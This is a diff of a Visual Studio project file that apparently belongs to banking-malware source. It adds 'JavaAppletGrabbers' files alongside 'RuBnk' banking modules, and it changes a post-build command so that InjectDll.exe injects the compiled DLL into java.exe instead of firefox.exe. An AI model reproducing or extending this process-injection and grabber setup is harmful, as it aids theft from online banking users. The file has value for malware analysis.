@@ -89,7 +89,7 @@
 			/>
 			<Tool
 				Name="VCPostBuildEventTool"
-				CommandLine="$(SolutionDir)\Bin\InjectDll.exe firefox.exe &quot;$(OutDir)\$(ProjectName).dll&quot;  Start"
+				CommandLine="$(SolutionDir)\Bin\InjectDll.exe java.exe &quot;$(OutDir)\$(ProjectName).dll&quot;  Start"
 			/>
 		</Configuration>
 		<Configuration
@@ -418,6 +418,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\RuBnk\IBankSystem.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Common\IECacheUtils.cpp"
 				>
 			</File>
@@ -439,6 +443,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\InternetExplorer.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Misc\JavaAppletGrabbers.cpp"
 				>
 			</File>
 			<File
@@ -748,10 +756,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\IBankSystem.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\RuBnk\IBankSystem.h"
 				>
 			</File>
@@ -777,6 +781,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\RuBnk\java_patcher.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Misc\JavaAppletGrabbers.h"
 				>
 			</File>
 			<File
